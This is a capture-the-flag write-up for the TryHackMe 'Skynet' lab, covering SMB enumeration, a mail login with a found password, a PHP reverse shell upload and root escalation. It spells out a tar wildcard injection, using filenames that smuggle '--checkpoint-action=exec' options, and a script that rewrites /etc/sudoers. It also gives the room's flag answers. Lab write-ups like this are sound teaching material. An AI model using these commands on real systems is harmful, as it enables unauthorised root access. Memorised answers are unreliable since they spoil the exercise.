**Room Link**: https://tryhackme.com/room/skynet  
**Difficulty**: Easy  
**Platform**: Linux  
**Author**: Ry@n

---
## Overview

A vulnerable Terminator themed Linux machine.

---
# Task 1: Deploy and compromise the vulnerable machine!

- OK First thing RECON:
- Im gonna use nmap to do active recon to get some information:
	- `nmap 10.201.70.238 -A -T 4`

![Nmap Scan](images/Pasted%20image%2020250817224505.png)

- I saw that they are using samba so let try to find a vuln in that version

![SMB Version](images/Pasted%20image%2020250817224955.png)

- Now i will use smbmap to enumerate

![SMBMap](images/Pasted%20image%2020250817232518.png)

- now let try to access anonymous on smbclient

![SMB Anonymous Access](images/Pasted%20image%2020250817232644.png)

- after we grab all the files we got a file call log1.txt that have something look like a list of password

![log1.txt Password List](images/Pasted%20image%2020250817232813.png)

- now let find a way to test is this list have anything usefull

![Mail Service Enumeration](images/Pasted%20image%2020250817232951.png)

- After a while i found that they have a mail server so let try to login using the log

![Miles Email Login](images/Pasted%20image%2020250817233114.png)

- bingo we now can log into the mail server using milesdyson:cyborg007haloterminator
- ## 1.What is Miles password for his emails?
	- Answer: cyborg007haloterminator
- After read his mail i found this

![Mail Contents](images/Pasted%20image%2020250817233426.png)

- now we can access his smb folder

![Miles SMB Folder](images/Pasted%20image%2020250817233644.png)

- i found this file look interesting so i download it

![Hidden Directory File](images/Pasted%20image%2020250817234215.png)

- Ohh i think we just found the hidden directory
## 2.What is the hidden directory?
- Answer :/45kra24zxs28v3yd
- Hmm it look like we dont have anything to do, let try enumerate the hidden directory
- We found a /administrator page

![Hidden Directory / Administrator](images/Pasted%20image%2020250818001402.png)

- now let try get access to this machine

![Administrator Panel](images/Pasted%20image%2020250818001618.png)

- found it, now let put our payload it to it
- i will use a php reverse payload,python simple server and metasploit handler

![Payload Upload](images/Pasted%20image%2020250818001747.png)
![Metasploit Handler](images/Pasted%20image%2020250818001759.png)

- now we got a RCE, let try to find the user name root flag
## 3. What is the user flag?
- Answer: 7ce5c2109a40f958099283600a9ae807

![User Flag](images/Pasted%20image%2020250818001948.png)

- now let try to get root access
	- decided to go the sudoers route. I ran "shell" to drop into a normal shell and ran the following to have a proper tty terminals session.

	`python -c 'import pty;pty.spawn("/bin/bash")';`
	- I moved to /var/www/html (which is the directory being tar'd) and ran the following.
	`echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh`
	`echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"`
	`echo "/var/www/html"  > --checkpoint=1`
	- After short while I ran "sudo -l" with the following results.
	- User www-data may run the following commands on skynet:
	    (root) NOPASSWD: ALL
	- I am now able to run "sudo cat /root/root.txt" 

![Root Flag](images/Pasted%20image%2020250818002820.png)

## 4.What is the root flag?
- Answer: 3f0372db24753accc7179a282cd6a949

